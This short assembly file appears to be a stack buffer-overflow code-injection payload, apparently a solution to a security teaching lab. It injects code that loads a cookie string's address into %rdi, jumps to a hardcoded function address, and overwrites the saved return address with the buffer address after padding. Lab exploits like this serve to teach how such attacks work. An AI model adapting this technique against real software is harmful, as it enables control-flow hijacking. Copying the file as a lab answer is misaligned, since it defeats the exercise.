.globl rsp
rsp:
    movq $data, %rdi
    pushq $0x4019a0
    retq

data:
    .asciz "2a402507"

pad:
    .org rsp + 0x18, 0x23

rbp:
    .quad rsp

tail:
    .byte 0xa
